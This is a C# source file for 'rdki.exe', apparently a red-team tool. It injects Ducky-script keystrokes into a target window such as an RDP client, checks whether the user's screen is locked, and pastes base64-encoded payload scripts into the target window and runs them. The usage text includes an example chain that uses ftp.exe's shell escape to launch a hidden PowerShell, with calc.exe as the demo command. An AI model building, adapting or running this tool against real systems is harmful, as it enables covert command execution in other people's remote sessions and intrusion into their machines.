using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Threading;
using System.Globalization;
using System.Diagnostics;
using System.Text;

namespace SimulateKeyPress
{
    public class KeyWords
    {
        public int shiftIndex;
        public int capsIndex;
        public int ctrlIndex;
        public int altIndex;
        public int lwinIndex;
        public int selectedIndex;
        public KeyWord[] m_KeyWords = Array.Empty<KeyWord>();
        public string m_AllItems = " ";
        private int GetSameItemKeyWordIndex(KeyWord kw)
        {
            for (int j = 0; j < m_KeyWords.Length; j++)
            {
                int i = m_KeyWords.Length - j - 1;
                if (m_KeyWords[i].LowerText.Equals(kw.LowerText, StringComparison.InvariantCulture) &&
                    m_KeyWords[i].AttachedText.Equals(kw.AttachedText, StringComparison.InvariantCulture))
                {
                    return i;
                }
            }
            return -1;
        }
        private int GetKeyWordIndexByAttachedText(string text)
        {
            for (int j = 0; j < m_KeyWords.Length; j++)
            {
                int i = m_KeyWords.Length - j - 1;
                if (m_KeyWords[i].AttachedText.Equals(text, StringComparison.InvariantCulture))
                {
                    return i;
                }
            }
            return -1;
        }
        private void AddKeyWord(string[] keyWord)
        {
            if (keyWord.Length > 0)
            {
                KeyWord kw = new KeyWord(keyWord, m_AllItems.Length);//, useFont);
                int nspaces = kw.Start - m_AllItems.Length;
                while (nspaces > 0)
                {
                    m_AllItems += " ";
                    nspaces--;
                }
                kw.IndexSameItem = GetSameItemKeyWordIndex(kw);
                Array.Resize(ref m_KeyWords, m_KeyWords.Length + 1);
                m_KeyWords[m_KeyWords.Length - 1] = kw;
                m_AllItems += " " + kw.Text + " ";
            }
        }
        public void ProcessKeyWords(string line)
        {
            m_KeyWords = Array.Empty<KeyWord>();
            string[] parts;
            string keyword = line.Replace("'|'", "\r");
            parts = keyword.Split(new char[] { '|' });
            AddKeyWord(parts);
            ctrlIndex = GetKeyWordIndexByAttachedText("{CTRL}");
            shiftIndex = GetKeyWordIndexByAttachedText("{SHIFT}");
            capsIndex = GetKeyWordIndexByAttachedText("{CAPSLOCK}");
            altIndex = GetKeyWordIndexByAttachedText("{ALT}");
            lwinIndex = GetKeyWordIndexByAttachedText("{LWIN}");
        }

        public class KeyWord
        {
            public KeyWord(string[] keyWord, int iStart)
            {
                if (keyWord.Length > 0)
                {
                    string key = keyWord[0].Trim(new char[] { ' ', '\t' });
                    int iOffset = keyWord[0].IndexOf(key);
                    bool cmd = keyWord.Length > 1 && keyWord[1].StartsWith("cmd:", StringComparison.InvariantCultureIgnoreCase);
                    string val = cmd ? keyWord[1].Substring(4) : (keyWord.Length > 1 ? keyWord[1] : key);
                    key = key.Replace("\r", "|");
                    val = val.Replace("\r", "|");
                    val = val.Replace("\\n", "\n");
                    string valUpper = val.Length == 1 ? val.ToUpperInvariant() : val;
                    string valLower = val.Length == 1 ? val.ToLowerInvariant() : val;
                    bool useWithShift = !valUpper.Equals(valLower, StringComparison.InvariantCulture);
                    string keyUpper = useWithShift ? key.ToUpperInvariant() : key;
                    string keyLower = useWithShift ? key.ToLowerInvariant() : key;
                    Start = iStart + iOffset;
                    Length = key.Length + 2;
                    IndexSameItem = -1;
                    Text = keyLower;
                    LowerText = keyLower;
                    UpperText = keyUpper;
                    AttachedText = valLower;
                    CanBeUsedWithShift = useWithShift;
                    IsShellCommand = cmd;
                }
            }
            public int Start { get; set; }
            public int Length { get; set; }
            public int IndexSameItem { get; set; }
            public string Text { get; set; }
            public string LowerText { get; set; }
            public string UpperText { get; set; }
            public string AttachedText { get; set; }
            public bool CanBeUsedWithShift { get; set; }
            public bool IsShellCommand { get; set; }
        }
        public class KeyboardInput
        {
            [DllImport("USER32.DLL", SetLastError = true)]
            public static extern IntPtr GetMessageExtraInfo();

            [DllImport("USER32.DLL")]
            public static extern short GetAsyncKeyState(int key);

            [DllImport("USER32.DLL")]
            public static extern short GetKeyState(int key);

            [DllImport("USER32.DLL", SetLastError = true)]
            private static extern uint SendInput(uint numberOfInputs, INPUT[] inputs, int sizeOfInputStructure);

            [DllImport("USER32.DLL")]
            private static extern uint MapVirtualKey(uint uCode, uint uMapType);
            [StructLayout(LayoutKind.Sequential)]
            internal struct INPUT
            {
                public uint Type;
                public MOUSEKEYBDHARDWAREINPUT Data;
            }
            [Flags]
            public enum KEYEVENTF
            {
                KEYDOWN = 0,
                EXTENDEDKEY = 0x0001,
                KEYUP = 0x0002,
                UNICODE = 0x0004,
                SCANCODE = 0x0008,
            }
            [StructLayout(LayoutKind.Explicit)]
            internal struct MOUSEKEYBDHARDWAREINPUT
            {
                [FieldOffset(0)]
                public HARDWAREINPUT Hardware;
                [FieldOffset(0)]
                public KEYBDINPUT Keyboard;
                [FieldOffset(0)]
                public MOUSEINPUT Mouse;
            }
            [StructLayout(LayoutKind.Sequential)]
            internal struct HARDWAREINPUT
            {
                public uint Msg;
                public ushort ParamL;
                public ushort ParamH;
            }
            [StructLayout(LayoutKind.Sequential)]
            internal struct KEYBDINPUT
            {
                public ushort Vk;
                public ushort Scan;
                public uint Flags;
                public uint Time;
                public IntPtr ExtraInfo;
            }
            [StructLayout(LayoutKind.Sequential)]
            internal struct MOUSEINPUT
            {
                public int X;
                public int Y;
                public uint MouseData;
                public uint Flags;
                public uint Time;
                public IntPtr ExtraInfo;
            }
            private INPUT[] inputs = Array.Empty<INPUT>();
            public bool m_ctrlPressed;
            public bool m_altPressed;
            public bool m_capsPressed;
            public bool m_shiftPressed;
            public bool m_lwinPressed;
            public bool CaseChanged = false;

            public const ushort VK_KEY_DOWN = (ushort)0x8000;
            public const ushort VK_KEY_TOGLED = (ushort)0x0001;
            public const byte VK_BACK = 0x08;
            public const byte VK_TAB = 0x09;
            public const byte VK_RETURN = 0x0D;
            public const byte VK_SHIFT = 0x10;
            public const byte VK_CONTROL = 0x11;
            public const byte VK_MENU = 0x12;
            public const byte VK_CAPITAL = 0x14;
            public const byte VK_ESCAPE = 0x1B;
            public const byte VK_SPACE = 0x20;
            public const byte VK_SNAPSHOT = 0x2C;
            public const byte VK_DELETE = 0x2E;
            public const byte VK_LWIN = 0x5B;
            public const byte VK_F1 = 0x70;
            public const byte VK_NUMLOCK = 0x90;

            public const int m_KeyDownProcessDelay = 100;
            public KeyboardInput()
            {
                ResetAll();
            }
            public void SimulateKeyDown(ushort vk, bool unicode = false)
            {
                INPUT input = new INPUT { Type = 1 };
                input.Data.Keyboard = new KEYBDINPUT()
                {
                    Vk = unicode ? (ushort)0 : vk,
                    Scan = unicode ? vk : (ushort)MapVirtualKey(vk, 0),
                    Flags = (uint)KEYEVENTF.KEYDOWN | (unicode ? (uint)KEYEVENTF.UNICODE : 0),
                    Time = 0,
                    ExtraInfo = GetMessageExtraInfo()
                };
                Array.Resize(ref inputs, inputs.Length + 1);
                inputs[inputs.Length - 1] = input;
            }
            public void SimulateKeybdKeyDown(ushort vk, bool unicode = false)
            {
                SimulateKeyDown(vk, unicode);
                if (!unicode)
                {
                    switch (vk)
                    {
                        case VK_MENU:
                            m_altPressed = true;
                            break;
                        case VK_CONTROL:
                            m_ctrlPressed = true;
                            break;
                        case VK_SHIFT:
                            m_shiftPressed = true;
                            CaseChanged = true;
                            break;
                        case VK_LWIN:
                            m_lwinPressed = true;
                            break;
                        case VK_CAPITAL:
                            m_capsPressed = !m_capsPressed;
                            SimulateKeyUp(vk, unicode);
                            CaseChanged = true;
                            break;
                        default:
                            return;
                    }
                    SendKeybdInput();
                    Thread.Sleep(m_KeyDownProcessDelay);
                }
            }
            public void SimulateKeyUp(ushort vk, bool unicode = false)
            {
                INPUT input = new INPUT { Type = 1 };
                input.Data.Keyboard = new KEYBDINPUT()
                {
                    Vk = unicode ? (ushort)0 : vk,
                    Scan = unicode ? vk : (ushort)MapVirtualKey(vk, 0),
                    Flags = (uint)KEYEVENTF.KEYUP | (unicode ? (uint)KEYEVENTF.UNICODE : 0),
                    Time = 0,
                    ExtraInfo = GetMessageExtraInfo(),
                };
                Array.Resize(ref inputs, inputs.Length + 1);
                inputs[inputs.Length - 1] = input;
            }
            public void SimulateKeybdKeyUp(ushort vk, bool unicode = false)
            {
                if (!unicode)
                {
                    switch (vk)
                    {
                        case VK_MENU:
                            m_altPressed = false;
                            break;
                        case VK_CONTROL:
                            m_ctrlPressed = false;
                            break;
                        case VK_SHIFT:
                            m_shiftPressed = false;
                            CaseChanged = true;
                            break;
                        case VK_LWIN:
                            m_lwinPressed = false;
                            break;
                        case VK_CAPITAL:
                            return;
                        default:
                            break;
                    }
                }
                SimulateKeyUp(vk, unicode);
            }
            public void SimulateKeybdKeyClick(ushort vk, bool unicode = false)
            {
                if (!unicode)
                {
                    switch (vk)
                    {
                        case VK_MENU:
                            if (!m_altPressed)
                                SimulateKeybdKeyDown(vk);
                            else
                                SimulateKeybdKeyUp(vk);
                            return;
                        case VK_SNAPSHOT:
                            SimulateKeybdKeyDown(VK_SNAPSHOT);
                            if (m_altPressed)
                                SimulateKeybdKeyUp(VK_MENU);
                            SimulateKeybdKeyUp(VK_SNAPSHOT);
                            return;
                        case VK_CONTROL:
                            if (!m_ctrlPressed)
                                SimulateKeybdKeyDown(VK_CONTROL);
                            else
                                SimulateKeybdKeyUp(VK_CONTROL);
                            return;
                        case VK_LWIN:
                            if (!m_lwinPressed)
                                SimulateKeybdKeyDown(VK_LWIN);
                            else
                                SimulateKeybdKeyUp(VK_LWIN);
                            return;
                        case VK_SHIFT:
                            if (!m_shiftPressed)
                                SimulateKeybdKeyDown(VK_SHIFT);
                            else
                                SimulateKeybdKeyUp(VK_SHIFT);
                            return;
                        case VK_CAPITAL:
                            m_capsPressed = !m_capsPressed;
                            SimulateKeybdKeyDown(vk, unicode);
                            return;
                        default:
                            break;
                    }
                }
                SimulateKeybdKeyDown(vk, unicode);
                SimulateKeybdKeyUp(vk, unicode);
            }
            public void SimulateKeybdString(string str)
            {
                while (str != null && str.Length > 0)
                {
                    char firstChar = str[0];
                    if (firstChar >= 0xbb && firstChar <= 0xbe)
                        SimulateKeybdKeyClick((ushort)(firstChar - 0x90), false);
                    else if (Char.IsDigit(firstChar))
                        SimulateKeybdKeyClick(firstChar, false);
                    else
                        SimulateKeybdKeyClick(firstChar, true);
                    str = str.Substring(1, str.Length - 1);
                    SendKeybdInput();
                }
            }
            public bool ChangeCase(string str)
            {
                if (str == null)
                    return false;
                string cb;
                if (str.StartsWith("{LOWERCASE}", StringComparison.InvariantCultureIgnoreCase))
                {
                    if (!m_ctrlPressed)
                    {
                        SimulateKeybdKeyDown(VK_CONTROL);
                        m_ctrlPressed = true;
                    }
                    SimulateKeybdKeyClick((ushort)'C');
                    SendKeybdInput();
                    Thread.Sleep(m_KeyDownProcessDelay);
                    cb = Clipboard.GetText(TextDataFormat.UnicodeText);
                    cb = cb.ToLowerInvariant();
                }
                else if (str.StartsWith("{UPPERCASE}", StringComparison.InvariantCultureIgnoreCase))
                {
                    if (!m_ctrlPressed)
                    {
                        SimulateKeybdKeyDown(VK_CONTROL);
                        m_ctrlPressed = true;
                    }
                    SimulateKeybdKeyClick((ushort)'C');
                    SendKeybdInput();
                    Thread.Sleep(m_KeyDownProcessDelay);
                    cb = Clipboard.GetText(TextDataFormat.UnicodeText);
                    cb = cb.ToUpperInvariant();
                }
                else
                    return false;
                SimulateKeybdKeyUp(VK_CONTROL);
                m_ctrlPressed = false;
                SimulateKeybdString(cb);
                return true;
            }
            public void SendKeybdInput()
            {
                if (inputs.Length > 0)
                {
                    try
                    {
                        uint intReturn = SendInput((uint)inputs.Length, inputs, Marshal.SizeOf(typeof(INPUT)));
                        var lastError = Marshal.GetLastWin32Error();
                        if (intReturn != inputs.Length)
                        {
                            int error = lastError;
                            Console.WriteLine(String.Format("SendInput error: {0}", error), "Input");
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(String.Format("E3: {0} - {1}.", ex.Source, ex.Message), "KeyboardInput");
                    }
                }
                inputs = Array.Empty<INPUT>();
            }
            public void ProcessKeyWord(KeyWord keyword)
            {
                string str = keyword.AttachedText;
                inputs = Array.Empty<INPUT>();
                int itemLength = 0;
                if (str.StartsWith("{", StringComparison.InvariantCultureIgnoreCase) && (itemLength = str.IndexOf('}') + 1) > 0)
                {
                    if (ChangeCase(str))
                    {
                    }
                    else if (str.StartsWith("{BACKSPACE}", StringComparison.InvariantCultureIgnoreCase))
                    {
                        SimulateKeybdKeyClick(VK_BACK);
                    }
                    else if (str.StartsWith("{ALT}", StringComparison.InvariantCultureIgnoreCase))
                    {
                        m_altPressed = !m_altPressed;
                        if (m_altPressed)
                            SimulateKeybdKeyDown(VK_MENU);
                        else
                            SimulateKeybdKeyUp(VK_MENU);
                    }
                    else if (str.StartsWith("{PRTSC}", StringComparison.InvariantCultureIgnoreCase))
                    {
                        SimulateKeybdKeyClick(VK_SNAPSHOT);
                        if (m_altPressed)
                        {
                            m_altPressed = false;
                            SimulateKeybdKeyUp(VK_MENU);
                        }
                    }
                    else if (str.StartsWith("{DEL}", StringComparison.InvariantCultureIgnoreCase))
                    {
                        SimulateKeybdKeyClick(VK_DELETE);
                    }
                    else if (str.StartsWith("{CTRL}", StringComparison.InvariantCultureIgnoreCase))
                    {
                        m_ctrlPressed = !m_ctrlPressed;
                        if (m_ctrlPressed)
                        {
                            SimulateKeybdKeyDown(VK_CONTROL);
                        }
                        else
                            SimulateKeybdKeyUp(VK_CONTROL);
                    }
                    else if (str.StartsWith("{LWIN}", StringComparison.InvariantCultureIgnoreCase))
                    {
                        m_lwinPressed = !m_lwinPressed;
                        if (m_lwinPressed)
                        {
                            SimulateKeybdKeyDown(VK_LWIN);
                        }
                        else
                            SimulateKeybdKeyUp(VK_LWIN);
                    }
                    else if (str.StartsWith("{SHIFT}", StringComparison.InvariantCultureIgnoreCase))
                    {
                        m_shiftPressed = !m_shiftPressed;
                        if (m_shiftPressed)
                            SimulateKeybdKeyDown(VK_SHIFT);
                        else
                            SimulateKeybdKeyUp(VK_SHIFT);
                        CaseChanged = true;
                    }
                    else if (str.StartsWith("{CAPSLOCK}", StringComparison.InvariantCultureIgnoreCase))
                    {
                        m_capsPressed = !m_capsPressed;
                        SimulateKeybdKeyClick(VK_CAPITAL);
                        CaseChanged = true;
                    }
                    else if (str.StartsWith("{SPACE}", StringComparison.InvariantCultureIgnoreCase))
                    {
                        SimulateKeybdKeyClick(VK_SPACE);
                    }
                    else if (str.StartsWith("{ESCAPE}", StringComparison.InvariantCultureIgnoreCase))
                    {
                        SimulateKeybdKeyClick(VK_ESCAPE);
                    }
                    else if (str.StartsWith("{ENTER}", StringComparison.InvariantCultureIgnoreCase))
                    {
                        SimulateKeybdKeyClick(VK_RETURN);
                    }
                    else if (str.StartsWith("{TAB}", StringComparison.InvariantCultureIgnoreCase))
                    {
                        SimulateKeybdKeyClick(VK_TAB);
                    }
                    else if (str.StartsWith("{F", StringComparison.InvariantCultureIgnoreCase))
                    {
                        if (int.TryParse(str.Substring(2, itemLength - 3), out int fv) && fv >= 1 && fv <= 24)
                        {
                            ushort fk = (ushort)(VK_F1 - 1 + fv);
                            SimulateKeybdKeyClick(fk);
                        }
                    }
                    else if (str.StartsWith("{VK_0X", StringComparison.InvariantCultureIgnoreCase))
                    {
                        if (int.TryParse(str.Substring(6, itemLength - 7), NumberStyles.HexNumber, CultureInfo.InvariantCulture, out int vk)
                            && vk >= 1 && vk <= 254)
                        {
                            SimulateKeybdKeyClick((ushort)(vk));
                        }
                    }
                    else if (str.StartsWith("{VK_UP_0X", StringComparison.InvariantCultureIgnoreCase))
                    {
                        if (int.TryParse(str.Substring(6, itemLength - 7), NumberStyles.HexNumber, CultureInfo.InvariantCulture, out int vk)
                            && vk >= 1 && vk <= 254)
                        {
                            SimulateKeybdKeyUp((ushort)(vk));
                        }
                    }
                    else if (str.StartsWith("{VK_DOWN_0X", StringComparison.InvariantCultureIgnoreCase))
                    {
                        if (int.TryParse(str.Substring(6, itemLength - 7), NumberStyles.HexNumber, CultureInfo.InvariantCulture, out int vk)
                            && vk >= 1 && vk <= 254)
                        {
                            SimulateKeybdKeyDown((ushort)(vk));
                        }
                    }
                    else
                        itemLength = 0;
                }
                SendKeybdInput();
            }

            public void ResetAll()
            {
                m_altPressed = false;
                m_ctrlPressed = false;
                m_capsPressed = false;
                m_shiftPressed = false;
                m_lwinPressed = false;
            }
        }
        public class ProcessDuckyScript
        {
            [DllImport("USER32.DLL")]
            private static extern bool SetForegroundWindow(IntPtr hWnd);

            //Import ShowWindowAsync For Max window size
            [DllImport("USER32.DLL")]
            private static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
            //Get Window Handle for Target Process
            private static IntPtr GetWindowHandle(string procName)
            {
                var isNumeric = int.TryParse(procName, out int n);
                try
                {
                    IntPtr windowHandle;
                    switch (isNumeric)
                    {
                        case true:
                            Process process = Process.GetProcessById(n);
                            windowHandle = process.MainWindowHandle;
                            Console.WriteLine("Window Title: " + process.MainWindowTitle);
                            return windowHandle;

                        case false:
                            Process[] processes = Process.GetProcessesByName(procName);
                            windowHandle = processes[0].MainWindowHandle;
                            Console.WriteLine("Window Title: " + processes[0].MainWindowTitle);
                            return windowHandle;
                        default:
                            throw new ArgumentOutOfRangeException("Could Not Find Target Process.");
                    }
                }
                catch (IndexOutOfRangeException e)
                {
                    System.Console.WriteLine(e.Message);
                    throw new ArgumentOutOfRangeException("Could Not Find Target Process.");
                }
            }
            //Execute keyword/special keys
            private void ExecuteSpecialKey(string specialKey)
            {
                KeyWords procKeyword = new KeyWords();
                KeyboardInput m_keybd = new KeyboardInput();
                procKeyword.ProcessKeyWords(specialKey);
                string[] words = specialKey.Split('|');
                switch (words[0])
                {
                    case "LWINR":
                        m_keybd.ProcessKeyWord(procKeyword.m_KeyWords[0]);
                        SendKeys.SendWait("r");
                        m_keybd.ProcessKeyWord(procKeyword.m_KeyWords[0]);
                        break;
                    case "LWINUP":
                        m_keybd.ProcessKeyWord(procKeyword.m_KeyWords[0]);
                        SendKeys.SendWait("{UP}");
                        m_keybd.ProcessKeyWord(procKeyword.m_KeyWords[0]);
                        break;
                    case "PASTE":
                        m_keybd.ProcessKeyWord(procKeyword.m_KeyWords[0]);
                        SendKeys.SendWait("v");
                        m_keybd.ProcessKeyWord(procKeyword.m_KeyWords[0]);
                        break;
                    default:
                        m_keybd.ProcessKeyWord(procKeyword.m_KeyWords[0]);
                        break;
                }
            }
            //Execute non keyword keystrokes
            private void ExecuteKeystrokes(string keyStrokes)
            {
                KeyboardInput m_keybd = new KeyboardInput();
                m_keybd.SimulateKeybdString(keyStrokes);
            }

            //Change the active screen size
            private void ChangeActiveScreenSize(string procName, int state)
            {
                IntPtr windowHandle = GetWindowHandle(procName);
                if (state != 4)
                {
                    ShowWindowAsync(windowHandle, state);
                    SetForegroundWindow(windowHandle);
                }
                else
                {
                    SetForegroundWindow(windowHandle);
                }

            }

            //Stage Payload In Clipboard
            private void LoadClipBoard(string payload)
            {
                byte[] byteResult = Convert.FromBase64String(payload);
                Clipboard.SetData(DataFormats.Text, (Object)Encoding.UTF8.GetString(byteResult));
            }

            private static bool LockStatus()
            {
                foreach (Process p in Process.GetProcesses())
                {
                    if (p.ProcessName.Contains("LogonUI"))
                    {
                        return true;
                    }
                }
                return false;
            }
            //Process Delays
            private void ExecuteDelay(string wait)
            {
                Thread.Sleep(int.Parse(wait));
            }
            public void ParseCommandArgs(string[] commands)
            {
                const int SW_SHOWNORM = 1;
                const int SW_SHOWMIN = 2;
                const int SW_SHOWMAX = 3;
                const int SW_ACTIVE = 4;

                if (commands[0] == "lockstatus")
                {
                    bool isLocked = LockStatus();
                    if (isLocked == true)
                    {
                        Console.WriteLine("The Screen Is Locked");
                        return;
                    }
                    else
                    {
                        Console.WriteLine("The Screen Is Unlocked");
                        return;
                    }
                }
                if (commands[1] == "title")
                {
                    GetWindowHandle(commands[0]);
                    return;
                }

                var duckyScript = commands[1].Split(new[] { "~~" }, StringSplitOptions.RemoveEmptyEntries);
                foreach (string s in duckyScript)
                {
                    Console.WriteLine(s);
                    string[] words = s.Split(' ');
                    switch (words[0])
                    {
                        case "ACTIVE":
                            ChangeActiveScreenSize(commands[0], SW_ACTIVE);
                            break;
                        case "MAX":
                            ChangeActiveScreenSize(commands[0], SW_SHOWMAX);
                            break;
                        case "MIN":
                            ChangeActiveScreenSize(commands[0], SW_SHOWMIN);
                            break;
                        case "NORM":
                            ChangeActiveScreenSize(commands[0], SW_SHOWNORM);
                            break;
                        case "FULL":
                            ChangeActiveScreenSize(commands[0], SW_SHOWNORM);
                            ExecuteSpecialKey("LWINUP|{LWIN}");
                            break;
                        case "DELAY":
                            ExecuteDelay(words[1]);
                            break;
                        case "STRING":
                            ExecuteKeystrokes(string.Join(" ", words, 1, (words.Length - 1)));
                            break;
                        case "VSTRING":
                            SendKeys.SendWait(string.Join(" ", words, 1, (words.Length - 1)));
                            SendKeys.SendWait("{ENTER}");
                            break;
                        case "GUI":

                            if (words[1] == "r")
                            {
                                ExecuteSpecialKey("LWINR|{LWIN}");
                            }
                            break;
                        case "ENTER":
                            ExecuteSpecialKey("ENTER|{ENTER}");
                            break;
                        case "PASTEPAYLOAD":
                            if (commands.Length != 3)
                            {
                                Console.WriteLine("Must Provide Base64 Encoded Command with PASTEPAYLOAD");
                                break;
                            }
                            LoadClipBoard(commands[2]);
                            ExecuteSpecialKey("PASTE|{CTRL}");
                            ExecuteSpecialKey("ENTER|{ENTER}");
                            Clipboard.Clear();
                            break;

                        default:
                            Console.WriteLine("Input Format Is Incorrect");
                            break;
                    }

                }

            }
        }
        class Program
        {
            static void Usage()
            {
                Console.WriteLine(" \"rdki.exe <processName>\" <Ducky Format with ~~ between commands>\r\n");
                Console.WriteLine(" \"rdki.exe lockstatus\" <<< this command will check if the users screen is locked (Could have false positives)");
                Console.WriteLine(" \"rdki.exe <processName/number> title\" <<< This command grabs the title of the process window your targeting");
                Console.WriteLine(" Extension Ducky Commands:");
                Console.WriteLine(" MAX ==> Maximize the target process window");
                Console.WriteLine(" MIN ==> Minimize the target process window");
                Console.WriteLine(" NORM ==> Bring target process window to its normal size");
                Console.WriteLine(" ACTIVE ==> Make target process window the active window (other size options do this after sizing");
                Console.WriteLine(" FULL ==> Make target process window full size (useful for applications like RDP");
                Console.WriteLine(" VSTRING ==> Type input as a \"virtual\" string ( Lets you type in some applications with them minimized eg putty)");
                Console.WriteLine(" PASTEPAYLOAD ==> Loads a base64 encoded payload script into clipboard buffer and pastes it into active window");
                Console.WriteLine(" If PASTEPAYLOAD is used an additional argument of base64 encoded script payload should be added.");
                Console.WriteLine(" EXAMPLE: rdki.exe mstsc 'FULL~~DELAY 100~~GUI r~~DELAY 100~~STRING ftp.exe~~DELAY 100~~ENTER~~DELAY 500~~PASTEPAYLOAD~~DELAY 200~~MIN' 'IXBvd2Vyc2hlbGwuZXhlIC13IGhpZGRlbiAtbm9wIC1jIGNhbGMuZXhl'");
            }
            [STAThread]
            static void Main(string[] args)
            {
                if (args.Length == 0)
                {
                    Usage();
                    return;
                }
                // Parse Ducky Args
                ProcessDuckyScript pds = new ProcessDuckyScript();
                pds.ParseCommandArgs(args);
            }
        }
    }
}